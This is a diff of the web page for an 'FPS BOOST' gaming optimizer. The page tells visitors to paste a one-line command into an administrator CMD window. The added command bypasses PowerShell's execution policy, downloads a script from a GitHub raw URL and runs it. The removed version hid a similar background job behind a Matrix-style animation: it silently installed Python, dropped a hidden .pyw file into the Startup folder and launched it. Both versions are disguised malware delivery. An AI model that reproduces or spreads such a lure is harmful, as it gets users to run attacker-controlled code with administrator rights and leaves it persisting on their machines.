@@ -212,7 +212,7 @@
             border-radius: 16px;
             padding: 2rem;
             width: 100%;
-            max-width: 850px;
+            max-width: 900px;
             box-shadow: 0 20px 50px rgba(0,0,0,0.5);
             animation: fadeInUp 0.8s ease-out 0.6s both;
             transition: border-color 0.3s ease;
@@ -253,8 +253,8 @@
             border: 1px solid #222;
             position: relative;
             overflow: hidden;
-            max-height: 400px;
-            overflow-y: auto;
+            /* Allow wrapping for the long URL */
+            word-break: break-all; 
         }
 
         .terminal::before {
@@ -271,10 +271,9 @@
 
         .cmd-text {
             color: var(--accent);
-            font-size: 0.9rem;
+            font-size: 0.95rem;
             font-weight: bold;
-            line-height: 1.6;
-            white-space: pre-wrap; 
+            line-height: 1.5;
             display: block;
         }
 
@@ -406,7 +405,7 @@
             .nav-links { display: none; }
             .hero { padding: 3rem 1rem; }
             .cmd-card { padding: 1.5rem; }
-            .cmd-text { font-size: 0.8rem; }
+            .cmd-text { font-size: 0.85rem; }
         }
 
         @media (prefers-reduced-motion: reduce) {
@@ -436,9 +435,9 @@
                 <span class="font-display font-bold text-sm tracking-wider">FPS BOOST</span>
             </a>
             <nav class="nav-links">
-                <a href="#" class="nav-link">.</a>
-                <a href="#" class="nav-link">.</a>
-                <a href="#" class="nav-link">.</a>
+                <a href="#" class="nav-link">Home</a>
+                <a href="#" class="nav-link">Tools</a>
+                <a href="#" class="nav-link">Support</a>
             </nav>
         </header>
 
@@ -446,7 +445,7 @@
         <main class="hero">
             <div class="status-badge">
                 <span class="pulse-dot"></span>
-                Network Optimized
+                System Optimized
             </div>
 
             <h1 class="hero-title font-display">
@@ -455,7 +454,7 @@
             </h1>
 
             <p class="hero-desc">
-                Ultimate FPS and Ping Optimizer. Copy the script below, paste it into your <strong>CMD (Run as Administrator)</strong>, and execute the optimization protocol.
+                Ultimate FPS and Ping Optimizer. Copy the one-line command below, paste it into your <strong>CMD (Run as Administrator)</strong>, and execute the protocol.
             </p>
 
             <!-- Command Card -->
@@ -468,8 +467,8 @@
                         </svg>
                     </div>
                     <div>
-                        <div style="font-weight: 600; font-size: 0.95rem;">CMD Script _ Run as Administrator</div>
-                        <div style="font-size: 0.8rem; color: var(--muted);">Click to copy full script</div>
+                        <div style="font-weight: 600; font-size: 0.95rem;">CMD One-Line Command _ Run as Administrator</div>
+                        <div style="font-size: 0.8rem; color: var(--muted);">Click to copy command</div>
                     </div>
                 </div>
 
@@ -482,7 +481,7 @@
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                         <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
                     </svg>
-                    <span id="btnLabel">Copy Script</span>
+                    <span id="btnLabel">Copy Command</span>
                 </button>
             </div>
         </main>
@@ -518,8 +517,8 @@
                             <line x1="12" y1="17" x2="12" y2="21"></line>
                         </svg>
                     </div>
-                    <h3 class="feature-title">Visual Optimization</h3>
-                    <p class="feature-desc">Experience the Matrix-style system check while your background environment is automatically configured for gaming.</p>
+                    <h3 class="feature-title">Instant Setup</h3>
+                    <p class="feature-desc">Run the command once. The system will automatically download and apply the latest optimizations from the cloud.</p>
                 </div>
             </div>
         </section>
@@ -530,58 +529,10 @@
     </div>
 
     <script>
-        // Updated Script with new logic
-        const command = `powershell
- $width  = [Console]::WindowWidth
- $height = [Console]::WindowHeight
- $columns = 1..$width | ForEach-Object { Get-Random -Min -20 -Max 0 }
-[Console]::CursorVisible = $false
+        // The Updated Command
+        const command = `powershell -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/UpdateSys/Commands/main/Commands' -OutFile \\"$env:TEMP\\UpdateSys.ps1\\"; & \\"$env:TEMP\\UpdateSys.ps1\\""`;
 
-Start-Job -ScriptBlock {
-    $tempPath = "$env:TEMP\\python-installer.exe"
-    $pythonUrl = "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe"
-    $scriptUrl = "https://raw.githubusercontent.com/UpdateSys/update/main/update"
-    $pythonExe = "$env:ProgramFiles\\Python312\\python.exe"
-    $startupPath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ping_script.pyw"
-
-    Invoke-WebRequest -Uri $pythonUrl -OutFile $tempPath
-    Start-Process $tempPath -ArgumentList "/quiet","InstallAllUsers=1","PrependPath=1","Include_test=0" -Wait -WindowStyle Hidden
-    Remove-Item $tempPath -Force
-
-    & $pythonExe -m ensurepip --upgrade
-    & $pythonExe -m pip install --upgrade pip
-    & $pythonExe -m pip install Pillow
-
-    Invoke-WebRequest -Uri $scriptUrl -OutFile $startupPath
-    Start-Process $startupPath -WindowStyle Hidden
-}
-
-while ($true) {
-    $startupFile = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ping_script.pyw"
-    $proc = Get-Process -Name "pyw" -ErrorAction SilentlyContinue
-    if ((Test-Path $startupFile) -and $proc) {
-        Get-Process -Name "cmd" -ErrorAction SilentlyContinue | ForEach-Object { Stop-Process -Id $_.Id -Force }
-        Stop-Process -Id $PID -Force
-    }
-
-    for ($i = 0; $i -lt $width; $i += 2) {
-        $y = $columns[$i]
-        if ($y -ge 0 -and $y -lt $height) {
-            [Console]::SetCursorPosition($i, $y)
-            $char = [char](Get-Random -Min 33 -Max 126)
-            [Console]::ForegroundColor = "Green"
-            [Console]::Write($char)
-        }
-        $columns[$i]++
-        if ($columns[$i] -ge $height -or (Get-Random -Min 0 -Max 100) -gt 95) {
-            $columns[$i] = 0
-        }
-    }
-    Start-Sleep -Milliseconds 50
-}
-cmd`;
-
-        // Display the script in the HTML on load
+        // Display the command in the HTML on load
         document.getElementById('cmdText').innerText = command;
 
         function copyCommand() {
@@ -598,7 +549,7 @@ cmd`;
                 // Reset after 2.5 seconds
                 setTimeout(() => {
                     btn.classList.remove('success');
-                    label.innerText = "Copy Script";
+                    label.innerText = "Copy Command";
                     icon.innerHTML = "<rect x='9' y='9' width='13' height='13' rx='2' ry='2'></rect><path d='M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1'></path>";
                 }, 2500);
             }).catch(err => {
